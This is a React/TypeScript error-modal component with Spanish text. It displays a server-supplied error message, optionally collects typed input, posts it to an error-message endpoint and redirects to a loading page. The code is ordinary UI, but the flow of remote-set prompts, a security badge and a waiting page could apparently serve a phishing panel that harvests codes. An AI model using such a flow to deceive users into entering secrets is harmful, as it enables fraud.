import { ChangeEvent, useState } from 'react'
import toast from 'react-hot-toast'
import { useNavigate, useParams } from 'react-router-dom'
import api from '../api/api'
import { SecurityBadge } from '../components/badges/SecurityBadge'
import { CloseButton } from '../components/ui/buttons/CloseButton'
import { CustomErrorInput } from '../components/ui/inputs/CustomErrorInput'
import { useErrorStore } from '../stores/useErrorStore'
import Error from '/src/assets/icons/Error.svg?react'

export function CustomErrorModal() {
  const { id } = useParams()
  const { errorText, needInput } = useErrorStore()

  const [answer, setAnswer] = useState('')

  const navigate = useNavigate()

  const callback = async (): Promise<void> => {
    if (answer.length <= 0) {
      toast.error(`No has introducido el texto`)
      return
    }

    await api.post(`/error-message/${id}`, {
      message: answer
    })

    setAnswer('')
    navigate(`/loading/${id}`, { replace: true })
  }

  return (
    <div className="relative flex h-full flex-col items-center rounded-2xl border border-black/20 bg-white px-10 py-10 font-system">
      <div className="mb-[14px] flex flex-row items-center gap-x-2.5">
        <Error />
        <h2 className="text-lg font-bold leading-[22px] text-black">Error</h2>
      </div>
      <h3 className="mb-[30px] w-full max-w-[280px] whitespace-pre-wrap break-words text-center font-normal leading-[19px]">
        {errorText}
      </h3>

      {needInput && (
        <CustomErrorInput
          value={answer}
          placeholder="Introducir texto"
          onChange={(e: ChangeEvent<HTMLInputElement>) => setAnswer(e.target.value)}
          className="mb-[22px]"
          callback={callback}
        />
      )}
      <SecurityBadge />
      <CloseButton className="absolute right-4 top-4" onClick={() => navigate(`/receive/${id}`)} />
    </div>
  )
}
